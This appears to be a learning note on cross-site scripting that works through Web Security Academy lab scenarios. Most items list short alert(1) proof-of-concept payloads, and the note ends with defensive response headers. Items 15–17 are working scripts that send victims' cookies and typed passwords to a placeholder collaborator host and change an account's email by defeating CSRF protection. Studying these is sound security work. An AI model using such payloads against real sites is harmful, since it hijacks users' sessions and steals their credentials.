# Cross-Site Scripting (XSS)

Cross-site scripting (XSS) is a vulnerability that enables attackers to inject malicious JavaScript into web pages. When executed inside a victim's browser, the attacker can compromise the user's interaction with the application.

---

## 📂 Types of XSS Attacks

### 1. Reflected XSS

- Occurs when the application immediately reflects unsanitized input from an HTTP request into the response.
- **Example:**
  ```html
  "><svg src=x onload=alert(1)>
  ```

### 2. Stored XSS

- Also known as **persistent XSS**, where malicious input is stored on the server and served to users in later HTTP responses.
- **Example:**
  ```html
  <><img src=1 onerror=alert(1)>
  ```

### 3. DOM-based XSS

- Involves the client-side JavaScript processing untrusted data and writing it to the DOM in an unsafe way.
- Example sinks: `document.write()`, `.innerHTML`, jQuery selectors, etc.

---

## 🔍 Example Scenarios

### 1.	DOM XSS in document.write sink using source location.search
­	 ![DOM XSS](screenshots/1.DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search.png)
-­	document.write() writes raw HTML into the page.
­-      "><svg src=x onload=alert(1)>
### 2.	DOM XSS in document.write sink using source location.search inside a select element
­	 
-     ­	"></select><img%20src=1%20onerror=alert(1)>
### 3.	DOM XSS in innerHTML sink using source location.search
­	
­	-      javascript:alert(1) 
- ­	Here query is directly injects it into the DOM using .innerHTML
-     ­	<img src=1 onerror=alert(1)>
### 4.	DOM XSS in jQuery anchor href attribute sink using location.search source
­	 
-     ­	https://academy.net/feedback?returnPath=javascript:alert(1)
### 5.	DOM XSS in jQuery selector sink using a hashchange event
­	 
- ­	This code listens to the URL hash fragment (everything after #).
- ­	It extracts that hash and injects it directly into a jQuery selector using :contains(...).
- ­	If an attacker can control the hash, they can break out of the selector string and inject arbitrary code.
-     ­	<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>             -- deliever from another server or html 
### 6.	Reflected DOM XSS
­	 
- ­	This line parses the server’s JSON response using eval(), which allows attackers to execute arbitrary JavaScript code if they control or tamper with the response.
-     ­	\"-alert(1)}//
### 7.	Stored DOM XSS
­	 
-     ­	<><img src=1 onerror=alert(1)>
### 8.	Reflected XSS into attribute with angle brackets HTML-encoded
­	 
-     ­	"onmouseover="alert(1)
### 9.	Stored XSS into anchor href attribute with double quotes HTML-encoded
­	 
### 10.	Reflected XSS into a JavaScript string with single quote and backslash escaped
­	 
-     ­	</script><script>alert(1)</script>
### 11.	Reflected XSS into a JavaScript string with angle brackets HTML encoded
­	 
-     ­	'-alert(1)-'
### 12.	Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
­	 
-     ­	\'-alert(1)//
### 13.	Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
­	 
-     ­	http://aa.com/?%27-alert(1)-%27 or http://aa.com/?&apos;-alert(1)-&apos;  
### 14.	Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
­	 
-     ­	${alert(1)}
### 15.	Exploiting cross-site scripting to steal cookies
-     ­	<script>
-     fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
-     method: 'POST',
-     mode: 'no-cors',
-     body:document.cookie
-     });
-     </script>
### 16.	Exploiting cross-site scripting to capture passwords
-     ­<input name=username id=username>
-     <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
-     method:'POST',
-     mode: 'no-cors',
-     body:username.value+':'+this.value
-     });">
### 17.	Exploiting XSS to bypass CSRF defences
-   	<script>
-     var req = new XMLHttpRequest();
-     req.onload = handleResponse;
-     req.open('get','/my-account',true);
-     req.send();
-     function handleResponse() {
-     var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
-     var changeReq = new XMLHttpRequest();
-     changeReq.open('post', '/my-account/change-email', true);
-     changeReq.send('csrf='+token+'&email=test@test.com')
- };
- </script>
---
## 🔎 Response Headers to Look For:

- Content-Type: Should be text/html; charset=UTF-8 or appropriate type.
- Content-Security-Policy: Helps mitigate XSS by restricting sources.
- X-Content-Type-Options: Should be nosniff.
- X-XSS-Protection: Older browsers may honor this.
- Set-Cookie: Should include HttpOnly and Secure flags to protect cookies.
- Access-Control-Allow-Origin: If incorrectly configured, it could expose data cross-domain.

